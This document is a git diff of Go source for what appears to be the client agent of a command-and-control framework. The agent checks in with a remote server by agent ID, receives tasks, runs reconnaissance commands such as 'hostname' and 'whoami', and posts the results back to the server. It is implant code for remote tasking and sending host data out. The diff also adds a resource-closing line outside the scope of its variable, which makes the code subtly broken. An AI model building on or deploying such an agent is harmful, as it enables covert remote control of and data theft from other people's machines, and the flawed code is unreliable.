@@ -1,6 +1,7 @@
-package main
+package includes
 
 import (
+	commands2 "Deanscup/client/includes/commands"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
@@ -21,7 +22,7 @@ type ResponseReply struct {
 	Output string `json:"output"`
 }
 
-func checkIn(ip string, port string, agent_id string) bool {
+func CheckIn(ip string, port string, agent_id string) bool {
 	// putting the url together lol
 	url := fmt.Sprintf("https://%s:%s/checkin/%s", ip, port, agent_id)
 
@@ -57,8 +58,8 @@ func checkIn(ip string, port string, agent_id string) bool {
 	fmt.Printf("[+] Task: %s\n", response.Task)
 
 	commands := map[string]func([]string) string{
-		"hostname": func(args []string) string { return Hostname() },
-		"whoami":   func(args []string) string { return Whoami() },
+		"hostname": func(args []string) string { return commands2.Hostname() },
+		"whoami":   func(args []string) string { return commands2.Whoami() },
 	}
 
 	var cmd_response string
@@ -77,11 +78,11 @@ func checkIn(ip string, port string, agent_id string) bool {
 			cmd_response = cmdFunc(cmdArgs)
 		} else {
 			fmt.Printf("[-] Unknown command: %s\n", cmdName)
+			cmd_response = "[-] Unknown command"
 		}
 	}
-
+	newUrl := fmt.Sprintf("https://%s:%s/response/%s", ip, port, agent_id)
 	if cmd_response != "" {
-		newUrl := fmt.Sprintf("https://%s:%s/response/%s", ip, port, agent_id)
 
 		responseReply := ResponseReply{
 			ID:     response.ID,
@@ -95,7 +96,7 @@ func checkIn(ip string, port string, agent_id string) bool {
 			return false
 		}
 
-		// ✅ Properly send the request and handle errors
+		// Properly send the request and handle errors
 		resp, err := client.Post(newUrl, "application/json", strings.NewReader(string(jsonValue)))
 		if err != nil {
 			fmt.Printf("[-] Failed to send response: %v\n", err)
@@ -104,5 +105,6 @@ func checkIn(ip string, port string, agent_id string) bool {
 		defer resp.Body.Close()
 
 	}
+	defer resp.Body.Close()
 	return true
 }
